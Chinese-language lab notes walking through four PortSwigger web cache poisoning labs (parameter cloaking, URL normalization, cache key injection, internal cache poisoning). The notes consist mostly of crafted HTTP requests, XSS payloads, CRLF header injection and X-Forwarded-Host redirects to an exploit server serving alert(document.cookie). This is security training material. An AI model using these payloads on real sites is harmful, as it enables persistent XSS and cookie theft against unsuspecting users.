## 缓存参数隐藏

实验：参数隐藏
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking

主页的响应中包含脚本
```html
<script type="text/javascript" src="/js/geolocate.js?callback=setCountryCookie"></script>
```
内容为
```javascript
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
setCountryCookie({"country":"United Kingdom"});
```

对脚本url进行修改 
/js/geolocate.js?callback=setLangCookie
返回
setLangCookie({"country":"United Kingdom"});

修改头部为
/js/geolocate.js?callback=alert(1)//
返回
alert(1)//({"country":"United Kingdom"});

尝试对原脚本url
/js/geolocate.js?callback=setCountryCookie
进行缓存投毒
/js/geolocate.js?callback=setCountryCookie;callback=alert(1)//
后一个参数的值可覆盖前一个参数的值，但无法被缓存
尝试参数解析怪癖，使用缓存键外的 utm_content 参数
/js/geolocate.js?callback=setCountryCookie&utm_content=bar;callback=alert(1)//

## 标准化缓存键
Lab: URL 规范化
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization

观察到对css文件的请求
GET /resources/css/labsBlog.css.map HTTP/2
响应为
Content-Type: text/html; charset=utf-8
```html
<p>Not Found: /resources/css/labsBlog.css.map</p>
```

测试XSS注入
GET /resources/css/<svg/onload=alert(1)> HTTP/2
响应为
```html
<p>Not Found: /resources/css/<svg/onload=alert(1)></p>
```
存在反射XSS

然而如使用浏览器请求，响应中符号被编码
GET /resources/css/%3Csvg/onload=alert(1)%3E HTTP/2
```html
<p>Not Found: /resources/css/%3Csvg/onload=alert(1)%3E</p>
```

使用主题教程的标准化缓存，发送使用原符号的XSS向量后，再发送被URL编码的url，此时编码后的url使用了原符号XSS的缓存

在攻击器重复XSS载荷的同时，向目标用户发送url链接
https://0a9e00a203cfbc1980c80355004c009e.web-security-academy.net/resources/css/%3Csvg/onload=alert(1)%3E


## !!缓存键注入
Lab: 缓存键注入
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection

使用缓存键查询头部
Pragma: x-get-cache-key
在响应中找到字段分隔符为
```$$```

GET / HTTP/2
响应为
Location: /login?lang=en

GET /login?lang=en HTTP/2
响应为
Location: /login/?lang=en

GET /login/?lang=en HTTP/2
修改为
GET /login/?lang=aaaaaaa HTTP/2
响应为
```html
<link rel="canonical" href='//0a02000b04cdf87b819e397500870054.web-security-academy.net/login/?lang=aaaaaaa'/>
<script src='/js/localize.js?lang=aaaaaaa&cors=0'></script>
```
/login/?lang的参数可控制html中脚本加载路径

GET /js/localize.js?lang=en&cors=0 HTTP/2
响应为
document.cookie = 'lang=en';
修改为
GET /js/localize.js?lang=en'&cors=1 HTTP/2
Origin: foooooooooo
响应头部新增为
Access-Control-Allow-Origin: foooooooooo
输入%0d%0a可换行后添加头部，存在头部注入
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)
此时响应体中包含注入脚本内容，使用查询参数 cors=1 与 控制的Origin头部

分为两大部分：
/js/localize.js 对响应脚本的头部注入，返回自定义脚本内容
/login/?lang    对html加载脚本链接的注入，设置脚本加载url


尝试匹配二者，实现缓存键注入
使用缓存键查询头部观察
Pragma: x-get-cache-key

脚本头部注入，Origin末尾的分隔符是在缓存键注入时发现url后使用了分隔符，于是添加以匹配
GET /js/localize.js?lang=en&cors=1&foo=bar HTTP/2
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$
响应缓存键为
/js/localize.js?lang=en&cors=1$$origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)

/login/?lang 阶段中，lang的参数将反射到响应中的脚本url。
对于末尾自动添加的 cors=0 参数，需使用#去除，发送时需url编码为 %23
/login/?lang=en&cors=1&foo=bar$$origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)#
回推的url编码为，确保在响应中才被解释为参数分隔符&以及标记符#，确保回车换行空格双重url编码
/login/?lang=en%26cors=1%26foo=bar$$origin=x%250d%250aContent-Length:%25208%250d%250a%250d%250aalert(1)%23

此时，若在浏览器中使用回推的url，将加载注入脚本缓存。
实现了发送诱导链接实现缓存投毒。
但仍未实现自动缓存投毒

尝试对302链中可缓存内容进行投毒
GET /login?lang=en?utm_content=x HTTP/2
响应为
Location: /login/?lang=en?utm_content=x
X-Cache-Key: /login?lang=en$$
此时，缓存忽略 utm_content，而原服务器作为参数值的一部分

修改回推的url添加 utm_content 参数
/login?lang=en?utm_content=x%26%26cors=1%26foo=bar$$origin=x%250d%250aContent-Length:%25208%250d%250a%250d%250aalert(1)%23
响应的html脚本url
/js/localize.js?lang=en?utm_content=x&&cors=1&foo=bar$$origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)

修改XSS脚本url参数
GET /js/localize.js?lang=en?&cors=1&foo=bar HTTP/2
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$

此时缓存键匹配
X-Cache-Key: /js/localize.js?lang=en?&cors=1&foo=bar$$origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$
或者将当前的匹配方式
lang=en?utm_content=x%26%26cors=1
lang=en?&cors=1
改为
lang=en?utm_content=x%26cors=1
lang=en?utm_content=x&cors=1
此时缓存键
X-Cache-Key: /js/localize.js?lang=en?cors=1&foo=bar$$origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$


## 毒化内部缓存

内部缓存投毒
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal

访问主页的响应包含脚本内容为
```html
<script type="text/javascript" src="//0ac7002c03890d4081712ff2005000a7.web-security-academy.net/resources/js/analytics.js"></script>
<script src=//0ac7002c03890d4081712ff2005000a7.web-security-academy.net/js/geolocate.js?callback=loadCountry></script>
<script>trackingID='6jk5xJpL8Gw3dj4P'</script>
```

GET /js/geolocate.js?callback=loadCountry HTTP/2
```javascript
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
loadCountry({"country":"United Kingdom"});
```


GET /resources/js/analytics.js HTTP/2
```javascript
function randomString(length, chars) {
    var result = '';
    for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
    return result;
}
var id = randomString(16, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
fetch('/analytics?id=' + id)
```

其中
/js/geolocate.js?callback=loadCountry
存在XSS注入
/js/geolocate.js?callback=fetch('https://exploit-0ae700c0036a0dfa81e12ede01a200bd.exploit-server.net/')//

在首页添加头部
X-Forwarded-Host: foooooooooo
响应反射为
```html
<link rel="canonical" href='//foooooooooo/'/>
<script type="text/javascript" src="//foooooooooo/resources/js/analytics.js"></script>
```
可注入脚本url或关闭双引号后注入标签
设置首页头部为
X-Forwarded-Host: exploit-0a00008f0351805c9e518c5101a200e5.exploit-server.net

设置控制页面路径为
/resources/js/analytics.js
设置控制页面头部为
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
Access-Control-Allow-Origin: *
设置控制页面响应体为
alert(document.cookie)

意外发现了额外的对控制服务器页面的请求
GET /js/geolocate.js?callback=loadCountry HTTP/2
Host: exploit-0a00008f0351805c9e518c5101a200e5.exploit-server.net
在日志中也看到目标用户对此资源的请求

其他内容不变，修改控制页面路径为
/js/geolocate.js?callback=loadCountry
持续进行首页头部 的X-Forwarded-Host 缓存投毒
直到通过lab

示例解决方案：
> 大多数时候，您会看到规范链接元素的 URL 和 analytics.js 导入现在都指向您的攻击服务器，但 geolocate.js 导入的 URL 保持不变
> 继续发送请求。最终，geolocate.js 资源的 URL 也将被覆盖为您的攻击服务器 URL
> 这表明这个片段是由内部缓存单独缓存的

在首页添加的头部最终将反射到 /js/geolocate.js?callback=loadCountry 的路径
而目标用户仅对 此url进行请求而不包含另一个，也可反映出此url作为缓存片段
